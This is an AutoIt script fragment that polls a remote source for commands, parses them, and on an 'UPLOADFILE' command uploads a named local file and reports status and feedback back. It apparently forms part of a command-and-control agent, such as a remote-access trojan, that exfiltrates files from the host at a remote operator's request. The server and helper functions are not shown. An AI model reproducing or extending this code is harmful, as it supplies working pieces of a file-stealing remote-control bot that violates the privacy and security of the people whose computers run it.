
 Func fetchCommands()
	 
	 Local $commandString=getCommands()
	  
	 if StringInStr($commandString,"SUCCESS") Then
		
		 Local $commandArray=StringSplit($commandString, "*")
		 
		 Local $commandUnit=$commandArray[1]
		 
		 Local $commandId=$commandArray[2]
		 
		 getCommandType($commandUnit,$commandArray,$commandId)
		 
	 EndIf
	 
 EndFunc
 
 
 Func getCommandType($commandUnit,$commandArray,$commandId)
	 
	 Local $commandUnitArray=StringSplit($commandUnit, ",")
	 
	 Local $command=$commandUnitArray[1]
	 
	 if StringInStr($command,"UPLOADFILE")  then 
		 
		 commandUPLOADFILE($commandUnitArray,$commandArray,$commandId)
	 
	EndIf
 
EndFunc

Func  commandUPLOADFILE($commandUnitArray,$commandArray,$commandId) 
	 
	 Local $file=$commandUnitArray[2]
	 
	 if FileExists($file) Then
		 
		 $result=putFile($file)
		 
		 putCommandStatus($commandId,"success")
		 
		 putCommandFeedBack($commandId, $result)
		 
	 Else
		 
		  putCommandStatus($commandId,"fail")
		  
		  putCommandFeedBack($commandId, "file does not exist")
		 
	 EndIf
	
EndFunc